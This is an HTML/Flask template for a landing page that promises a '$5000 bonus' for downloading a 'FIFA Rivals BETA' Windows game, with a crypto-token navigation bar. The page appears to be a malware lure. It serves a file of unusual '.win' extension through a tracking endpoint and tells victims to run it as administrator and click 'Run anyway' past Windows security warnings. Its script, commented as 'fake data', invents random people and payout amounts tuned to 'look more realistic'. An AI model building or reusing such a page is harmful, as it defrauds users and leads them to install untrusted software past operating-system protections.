<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download FIFA Rivals - Get $5000 Bonus</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
  <style>
    .notification-container {
      position: fixed;
      bottom: 20px;
      left: 20px;
      z-index: 1000;
    }

    .notification {
      background: rgba(10, 14, 23, 0.95);
      border: 1px solid rgba(220, 38, 38, 0.4);
      border-radius: 12px;
      padding: 12px 16px;
      margin-top: 10px;
      color: white;
      font-size: 14px;
      transform: translateX(-120%);
      opacity: 0;
      transition: all 0.3s ease-in-out;
      max-width: 300px;
    }

    .notification.show {
      transform: translateX(0);
      opacity: 1;
    }

    .notification .amount {
      color: #22c55e;
      font-weight: 600;
    }

    .notification .location {
      color: rgba(255, 255, 255, 0.7);
    }

    .modal-content {
      max-width: 600px;
      padding: 30px;
    }
    
    .installation-steps {
      color: rgba(255, 255, 255, 0.9);
      margin: 20px 0;
    }
    
    .step {
      margin-bottom: 24px;
    }
    
    .step h3 {
      color: #fff;
      font-size: 18px;
      margin-bottom: 12px;
      font-weight: 600;
    }
    
    .step ul {
      list-style: none;
      padding-left: 20px;
    }
    
    .step ul li {
      margin: 8px 0;
      position: relative;
    }
    
    .step ul li:before {
      content: "•";
      color: #22c55e;
      font-weight: bold;
      position: absolute;
      left: -15px;
    }
    
    .step code {
      background: rgba(255, 255, 255, 0.1);
      padding: 2px 6px;
      border-radius: 4px;
      font-family: monospace;
      font-size: 14px;
    }
    
    .note {
      color: rgba(255, 255, 255, 0.7);
      font-style: italic;
    }
  </style>
</head>
<body>
  <!-- Navigation Header -->
  <header class="nav-header">
    <div class="nav-container">
      <a href="#" class="logo">
        <svg xmlns="http://www.w3.org/2000/svg" width="39" height="50" viewBox="0 0 39 50" fill="none">
          <path d="M19.1667 0C8.58113 0 1.1049e-05 8.49544 1.1049e-05 18.9755V31.0245C-0.0028915 33.6975 0.566107 36.3407 1.66955 38.7802C2.77298 41.2197 4.38584 43.4002 6.40192 45.1781C9.91046 48.289 14.4566 50.0063 19.1666 50C23.8766 50.0064 28.4228 48.289 31.9314 45.178L6.40192 45.1781V18.9755C6.40192 15.6239 7.74677 12.4096 10.1406 10.0396C12.5345 7.66964 15.7812 6.33821 19.1667 6.33821C22.5521 6.33821 25.7989 7.66964 28.1927 10.0396C30.5866 12.4096 31.9314 15.6239 31.9314 18.9755L31.9314 45.178C33.9474 43.4002 35.5603 41.2197 36.6638 38.7802C37.7672 36.3407 38.3362 33.6975 38.3333 31.0245V18.9755C38.3333 8.49544 29.7522 0 19.1667 0Z" fill="white"/>
        </svg>
      </a>

      <nav class="nav-links">
        <a href="#" class="nav-link">Foundation</a>
        <a href="#" class="nav-link">Mythos Token</a>
        <a href="#" class="nav-link">Analytics</a>
        <a href="#" class="nav-link">Partners</a>
        <a href="#" class="nav-link">Advisors</a>
        <a href="#" class="nav-link">Resources</a>
      </nav>

      <div class="nav-right">
        <select>
          <option value="en">ENG</option>
        </select>
        <button class="buy-token-btn">buy token</button>
      </div>
    </div>
  </header>

  <section class="bg-radial-gradient">
    <div class="content-container">
      <div class="content-section">
        <div class="chip-container">
          <div class="chip-label">Myth</div>
        </div>
        
        <h1 class="bg-title-gradient">
          Download FIFA Rivals BETA and Get $5000 Bonus
        </h1>
        
        {% if device_type == 'unsupported' %}
        <p>
          FIFA Rivals is currently only available for Windows PC. Please visit this page from a Windows computer to download and claim your $5000 bonus.
        </p>
        <button class="download-btn" disabled style="opacity: 0.5;">Download Not Available</button>
        {% else %}
        <p>
          Be among the first 1,000 users to download and play the Windows trial to claim your $5000 bonus.
        </p>

        <button id="downloadBtn" class="download-btn">
          Download for Windows
        </button>

        <div class="requirements-text">
          Requirements: Windows 10/11, 8GB RAM, DirectX 12
        </div>
        {% endif %}
      </div>
    </div>
  </section>

  <!-- Mobile Warning Modal -->
  <div id="mobileModal" class="modal">
    <div class="modal-content">
      <button class="close-modal" onclick="closeModal()">×</button>
      <h2>Windows PC Required</h2>
      <p>FIFA Rivals is only available for Windows PC. Please use a Windows computer to download and claim your $5000 bonus.</p>
      <button class="modal-btn" onclick="closeModal()">Got it</button>
    </div>
  </div>

  <!-- Installation Instructions Modal -->
  <div id="instructionsModal" class="modal">
    <div class="modal-content">
      <button class="close-modal" onclick="closeInstructionsModal()">×</button>
      <h2>Installation Instructions</h2>
      <div class="installation-steps">
        <div class="step">
          <h3>Step 1: Extract the ZIP file</h3>
          <ul>
            <li>Locate the downloaded file with .win extension</li>
            <li>Right-click and select "Extract All" or use WinRAR/7-Zip</li>
            <li>Choose a destination folder and click Extract</li>
          </ul>
        </div>

        <div class="step">
          <h3>Step 2: Install the Game</h3>
          <ul>
            <li>Open the extracted folder</li>
            <li>Run the installer as administrator</li>
            <li>Follow the installation wizard</li>
            <li class="note">Note: If Windows shows a security warning, click "More info" and "Run anyway"</li>
          </ul>
        </div>

        <div class="step">
          <h3>Step 3: Claim Your Bonus</h3>
          <ul>
            <li>Launch FIFA Rivals</li>
            <li>Create your account or sign in</li>
            <li>Your $5000 bonus will be automatically credited</li>
            <li class="note">Bonus is limited to first 1,000 users</li>
          </ul>
        </div>
      </div>
      <button class="modal-btn" onclick="closeInstructionsModal()">Got it</button>
    </div>
  </div>

  <div class="notification-container" id="notificationContainer"></div>

  <script>
    // Mobile detection function
    function isSupportedDevice() {
      const userAgent = navigator.userAgent.toLowerCase();
      return userAgent.includes('windows');
    }

    // Get DOM elements
    const downloadBtn = document.getElementById('downloadBtn');
    const mobileModal = document.getElementById('mobileModal');
    const instructionsModal = document.getElementById('instructionsModal');
    const closeModalBtns = document.querySelectorAll('.close-modal');

    // Show/close modal functions
    function showModal() {
      if (mobileModal) {
        mobileModal.style.display = 'block';
      }
    }

    function closeModal() {
      if (mobileModal) {
        mobileModal.style.display = 'none';
      }
    }

    function showInstructionsModal() {
      if (instructionsModal) {
        instructionsModal.style.display = 'block';
      }
    }

    function closeInstructionsModal() {
      if (instructionsModal) {
        instructionsModal.style.display = 'none';
      }
    }

    // Updated download function to use Flask endpoint
    function startDownload() {
      fetch('/track-download', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        }
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          // Show instructions modal
          showInstructionsModal();
          
          // Start the download
          const link = document.createElement('a');
          link.href = data.download_url;
          link.download = data.filename;
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);
        } else {
          alert(data.message || 'Download is currently unavailable. Please try again later.');
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while processing your download. Please try again later.');
      });
    }

    // Check if supported device and set up event listeners
    if (!isSupportedDevice()) {
      if (downloadBtn) {
        downloadBtn.classList.add('disabled');
        downloadBtn.addEventListener('click', function(e) {
          e.preventDefault();
          showModal();
        });
      }
    } else {
      if (downloadBtn) {
        downloadBtn.addEventListener('click', startDownload);
      }
    }

    // Modal close button event listeners
    closeModalBtns.forEach(btn => {
      btn.addEventListener('click', function() {
        closeModal();
        closeInstructionsModal();
      });
    });

    // Close modals when clicking outside
    window.addEventListener('click', function(e) {
      if (e.target === mobileModal) {
        closeModal();
      }
      if (e.target === instructionsModal) {
        closeInstructionsModal();
      }
    });

    // Check for supported device on resize
    window.addEventListener('resize', function() {
      if (!isSupportedDevice()) {
        if (downloadBtn && !downloadBtn.classList.contains('disabled')) {
          downloadBtn.classList.add('disabled');
        }
      } else {
        if (downloadBtn) {
          downloadBtn.classList.remove('disabled');
        }
      }
    });

    // Fake data for notifications
    const names = [
      // Western names
      'Greg', 'Andrew', 'Emma', 'Sophie', 'James', 'William', 'Oliver', 'Charlotte', 'Lucas', 'Henry',
      'Ethan', 'Alexander', 'Michael', 'Daniel', 'David', 'Sarah', 'Emily', 'Isabella', 'Sophia', 'Olivia',
      // Asian names
      'Jing', 'Yuki', 'Wei', 'Hiroshi', 'Jin', 'Seo-yeon', 'Ming', 'Kai', 'Yuna', 'Haruto',
      'Ravi', 'Arjun', 'Priya', 'Arun', 'Deepak', 'Ananya', 'Zara', 'Ayesha', 'Krishna', 'Aarav',
      // European names
      'Ivan', 'Hans', 'Klaus', 'Sofia', 'Anna', 'Marco', 'Giuseppe', 'Pavel', 'Dmitri', 'Viktor',
      'Luca', 'Francesco', 'Elena', 'Natasha', 'Anastasia', 'Pierre', 'Jean', 'Marie', 'Luis', 'Carlos',
      // Middle Eastern names
      'Ahmed', 'Mohammed', 'Fatima', 'Hassan', 'Ali', 'Yasmin', 'Omar', 'Leila', 'Karim', 'Amir',
      // Latin American names
      'Maria', 'Jose', 'Juan', 'Miguel', 'Roberto', 'Ana', 'Isabella', 'Gabriel', 'Rafael', 'Diego',
      // African names
      'Kwame', 'Chioma', 'Oluwaseun', 'Amara', 'Tendai', 'Zainab', 'Malik', 'Aisha', 'Jabari', 'Folami'
    ];

    const locations = [
      // North America
      { city: 'New York', country: 'USA' },
      { city: 'Los Angeles', country: 'USA' },
      { city: 'Chicago', country: 'USA' },
      { city: 'Toronto', country: 'Canada' },
      { city: 'Vancouver', country: 'Canada' },
      { city: 'Montreal', country: 'Canada' },
      { city: 'Texas', country: 'USA' },
      { city: 'Miami', country: 'USA' },
      { city: 'Seattle', country: 'USA' },
      { city: 'Boston', country: 'USA' },
      
      // Europe
      { city: 'London', country: 'UK' },
      { city: 'Manchester', country: 'UK' },
      { city: 'Liverpool', country: 'UK' },
      { city: 'Paris', country: 'France' },
      { city: 'Lyon', country: 'France' },
      { city: 'Berlin', country: 'Germany' },
      { city: 'Munich', country: 'Germany' },
      { city: 'Madrid', country: 'Spain' },
      { city: 'Barcelona', country: 'Spain' },
      { city: 'Rome', country: 'Italy' },
      { city: 'Milan', country: 'Italy' },
      { city: 'Amsterdam', country: 'Netherlands' },
      { city: 'Brussels', country: 'Belgium' },
      { city: 'Vienna', country: 'Austria' },
      { city: 'Stockholm', country: 'Sweden' },
      { city: 'Oslo', country: 'Norway' },
      { city: 'Moscow', country: 'Russia' },
      { city: 'St. Petersburg', country: 'Russia' },
      
      // Asia
      { city: 'Tokyo', country: 'Japan' },
      { city: 'Osaka', country: 'Japan' },
      { city: 'Seoul', country: 'South Korea' },
      { city: 'Busan', country: 'South Korea' },
      { city: 'Beijing', country: 'China' },
      { city: 'Shanghai', country: 'China' },
      { city: 'Hong Kong', country: 'China' },
      { city: 'Singapore', country: 'Singapore' },
      { city: 'Mumbai', country: 'India' },
      { city: 'Delhi', country: 'India' },
      { city: 'Bangalore', country: 'India' },
      { city: 'Bangkok', country: 'Thailand' },
      { city: 'Manila', country: 'Philippines' },
      { city: 'Jakarta', country: 'Indonesia' },
      
      // Middle East
      { city: 'Dubai', country: 'UAE' },
      { city: 'Abu Dhabi', country: 'UAE' },
      { city: 'Doha', country: 'Qatar' },
      { city: 'Riyadh', country: 'Saudi Arabia' },
      { city: 'Istanbul', country: 'Turkey' },
      
      // Oceania
      { city: 'Sydney', country: 'Australia' },
      { city: 'Melbourne', country: 'Australia' },
      { city: 'Brisbane', country: 'Australia' },
      { city: 'Perth', country: 'Australia' },
      { city: 'Auckland', country: 'New Zealand' },
      
      // Latin America
      { city: 'Mexico City', country: 'Mexico' },
      { city: 'São Paulo', country: 'Brazil' },
      { city: 'Rio de Janeiro', country: 'Brazil' },
      { city: 'Buenos Aires', country: 'Argentina' },
      { city: 'Santiago', country: 'Chile' },
      { city: 'Lima', country: 'Peru' },
      { city: 'Bogotá', country: 'Colombia' },
      
      // Africa
      { city: 'Cairo', country: 'Egypt' },
      { city: 'Lagos', country: 'Nigeria' },
      { city: 'Nairobi', country: 'Kenya' },
      { city: 'Cape Town', country: 'South Africa' },
      { city: 'Johannesburg', country: 'South Africa' },
      { city: 'Casablanca', country: 'Morocco' }
    ];

    // Remove the predefined amounts array and add a function to generate random amounts
    function getRandomAmount() {
      // Generate base amount between 500 and 5000
      let baseAmount = Math.floor(Math.random() * 4501) + 500;
      
      // Round to nearest 50 or 100 to make it look more realistic
      if (baseAmount < 1000) {
        baseAmount = Math.round(baseAmount / 50) * 50; // Round to nearest 50 for smaller amounts
      } else {
        baseAmount = Math.round(baseAmount / 100) * 100; // Round to nearest 100 for larger amounts
      }
      
      // 10% chance of a special high amount between 5000 and 10000
      if (Math.random() < 0.1) {
        baseAmount = Math.floor(Math.random() * 5001) + 5000;
        baseAmount = Math.round(baseAmount / 500) * 500; // Round to nearest 500 for large amounts
      }
      
      return baseAmount;
    }

    function createNotification() {
      const name = names[Math.floor(Math.random() * names.length)];
      const location = locations[Math.floor(Math.random() * locations.length)];
      const amount = getRandomAmount();
      const isDownload = Math.random() < 0.3; // 30% chance of just download notification

      const notification = document.createElement('div');
      notification.className = 'notification';
      
      if (isDownload) {
        notification.innerHTML = `<strong>${name}</strong> from <span class="location">${location.city}, ${location.country}</span> just downloaded`;
      } else {
        notification.innerHTML = `<strong>${name}</strong> from <span class="location">${location.city}, ${location.country}</span> just installed and claimed <span class="amount">$${amount.toLocaleString()}</span>`;
      }

      const container = document.getElementById('notificationContainer');
      container.appendChild(notification);

      // Trigger animation
      setTimeout(() => {
        notification.classList.add('show');
      }, 100);

      // Remove notification after 5 seconds
      setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => {
          container.removeChild(notification);
        }, 300);
      }, 5000);
    }

    // Show first notification after 2 seconds
    setTimeout(() => {
      createNotification();
      // Then show new notifications randomly between 3 and 8 seconds
      setInterval(() => {
        createNotification();
      }, Math.random() * 5000 + 3000);
    }, 2000);
  </script>
</body>
</html> 